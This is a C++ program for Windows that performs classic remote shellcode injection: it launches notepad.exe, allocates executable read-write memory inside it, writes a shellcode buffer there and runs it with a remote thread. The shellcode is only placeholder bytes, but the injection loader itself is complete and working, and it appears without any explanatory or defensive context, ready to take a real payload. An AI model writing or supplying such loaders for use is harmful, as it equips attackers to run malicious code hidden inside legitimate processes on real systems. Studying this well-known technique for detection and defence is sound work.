#include <windows.h>
#include <stdio.h>
#include <iostream>

using namespace std;

STARTUPINFOW si = { 0 };
PROCESS_INFORMATION pi = { 0 };
DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char shellcode[] =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int iShellCodeSize = sizeof(shellcode);

int main(void) {

	if (!CreateProcessW(
		L"C:\\Windows\\System32\\notepad.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		NORMAL_PRIORITY_CLASS,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		cout << "Failed to start process!\n";
	};

	hProcess = pi.hProcess;

	if (hProcess == NULL) {
		cout << "couldn't get a handle to the process\n";
		return EXIT_FAILURE;
	}
	else {
		cout << "\ngot a handle to the process!\n";
	}
	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		iShellCodeSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (rBuffer == NULL) {
		cout << "Couldn't allocate memory\n";
		return EXIT_FAILURE;
	}
	else {
		cout << "allocated memory with rwx permissions!\n";
	}

	WriteProcessMemory(
		hProcess,
		rBuffer,
		shellcode,
		iShellCodeSize,
		NULL
	);

	cout << "wrote memorys to process memory!\n";

	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID
	);

	if (hThread == NULL) {

		cout << "failed to get a handle to the thread\n";
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	else {
		cout << "got a handle to the thread\n";
	}

	cout << "Waiting for thread to finish!\n";

	WaitForSingleObject(hThread, INFINITE);

	cout << "Thread is finished processing!\n";

	cout << "Closing all handles!\n";
	
	CloseHandle(hThread);
	CloseHandle(hProcess);

	cout << "Finished cleaning up!\n";

	return EXIT_SUCCESS;
};
